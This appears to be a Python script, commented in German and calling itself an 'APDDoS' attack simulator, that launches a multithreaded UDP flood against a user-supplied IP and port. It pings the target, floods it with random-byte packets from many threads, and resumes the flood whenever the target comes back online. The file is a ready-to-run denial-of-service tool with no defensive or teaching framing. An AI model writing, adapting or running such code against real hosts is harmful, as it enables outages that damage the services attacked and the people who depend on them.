import os
import random
import socket
import threading
import time
import subprocess

# Globale Variablen
packet_counter = 0  # Zähler für gesendete Pakete
stop_event = threading.Event()  # Ereignis zum Stoppen der Angriffe


# Funktion zur Überprüfung, ob Ziel erreichbar ist
def is_target_online(ip):
    try:
        # Ping-Befehl ausführen
        result = subprocess.run(
            ["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        return result.returncode == 0  # Rückgabewert 0 bedeutet erreichbar
    except Exception as e:
        print(f"Fehler bei der Ping-Überprüfung: {e}")
        return False


# Angriffsfunktion (UDP Flood als Beispiel)
def udp_flood(ip, port, packet_size):
    global packet_counter
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_bytes = random._urandom(packet_size)
    while not stop_event.is_set():
        sock.sendto(udp_bytes, (ip, port))
        packet_counter += 1


# Hauptprogramm
if __name__ == "__main__":
    os.system("clear")
    print("APDDoS-Angriffssimulator")

    # Eingaben
    ip = input("Ziel-IP-Adresse: ")
    port = int(input("Ziel-Port: "))
    packet_size = int(input("Paketgröße in Bytes (z. B. 1024): "))
    num_threads = int(input("Anzahl der Threads: "))

    print(f"Starte Angriff auf {ip}:{port} mit {num_threads} Threads...")

    try:
        while True:
            if is_target_online(ip):
                print(f"[INFO] Ziel {ip} ist online. Angriff wird gestartet.")
                # Threads für den Angriff starten
                for _ in range(num_threads):
                    thread = threading.Thread(target=udp_flood, args=(ip, port, packet_size))
                    thread.daemon = True
                    thread.start()
                # Warten, bis Ziel offline ist
                while is_target_online(ip):
                    time.sleep(1)
                print(f"[INFO] Ziel {ip} ist offline. Angriff wird pausiert.")
                stop_event.set()  # Angriffe stoppen
                stop_event.clear()
            else:
                print(f"[INFO] Ziel {ip} ist offline. Warte...")
                time.sleep(5)  # 5 Sekunden warten und erneut prüfen

    except KeyboardInterrupt:
        print("\n[INFO] Angriff gestoppt!")
        stop_event.set()
